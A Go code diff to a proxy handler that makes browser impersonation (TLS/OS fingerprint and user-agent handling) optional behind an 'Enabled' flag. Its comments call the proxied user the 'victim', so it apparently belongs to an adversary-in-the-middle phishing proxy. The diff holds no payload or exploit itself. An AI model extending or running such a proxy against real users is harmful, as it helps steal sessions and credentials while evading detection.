@@ -251,8 +251,8 @@ func (m *ProxyHandler) createHTTPClient(req *http.Request, proxyConfig *service.
 	// create surf client with builder
 	builder := surf.NewClient().Builder()
 
-	// apply impersonation settings if configured
-	if proxyConfig.Impersonation != nil {
+	// apply impersonation settings if configured and enabled
+	if proxyConfig.Impersonation != nil && (proxyConfig.Impersonation.Enabled == nil || *proxyConfig.Impersonation.Enabled) {
 		impersonate := builder.Impersonate()
 
 		// set os first if specified
@@ -286,16 +286,7 @@ func (m *ProxyHandler) createHTTPClient(req *http.Request, proxyConfig *service.
 		case "http3":
 			builder.HTTP3()
 		}
-
-		// handle user agent configuration
-		if proxyConfig.Impersonation.UserAgent != "" {
-			// explicit custom user agent override
-			builder.UserAgent(proxyConfig.Impersonation.UserAgent)
-		} else if proxyConfig.Impersonation.PreserveUA != nil && !*proxyConfig.Impersonation.PreserveUA {
-			// use surf's impersonated user agent - we'll clear victim's UA from the request later
-			// surf will automatically set the appropriate UA for the impersonated browser
-		}
-		// else: preserve victim's UA (their UA header stays in the request)
+		// note: if enabled: false, no impersonation is applied at all
 	}
 
 	// apply proxy if configured
@@ -762,17 +753,12 @@ func (m *ProxyHandler) prepareRequestForTarget(req *http.Request, client *http.C
 	req.RequestURI = ""
 	req.Header.Del("Accept-Encoding")
 
-	// handle user agent based on impersonation config
-	if proxyConfig.Impersonation != nil {
-		if proxyConfig.Impersonation.UserAgent != "" {
-			// explicit custom user agent - set it
-			req.Header.Set("User-Agent", proxyConfig.Impersonation.UserAgent)
-		} else if proxyConfig.Impersonation.PreserveUA != nil && !*proxyConfig.Impersonation.PreserveUA {
-			// use surf's impersonated user agent - clear victim's UA so surf's will be used
-			req.Header.Del("User-Agent")
-		}
-		// else: preserve victim's UA - do nothing, their header stays
+	// handle user agent based on impersonation config (only if enabled)
+	if proxyConfig.Impersonation != nil && (proxyConfig.Impersonation.Enabled == nil || *proxyConfig.Impersonation.Enabled) {
+		// use surf's impersonated user agent - clear victim's UA so surf's will be used
+		req.Header.Del("User-Agent")
 	}
+	// else: impersonation disabled - victim's UA passes through unchanged
 
 	// setup cookie jar for redirect handling
 	jar, _ := cookiejar.New(nil)
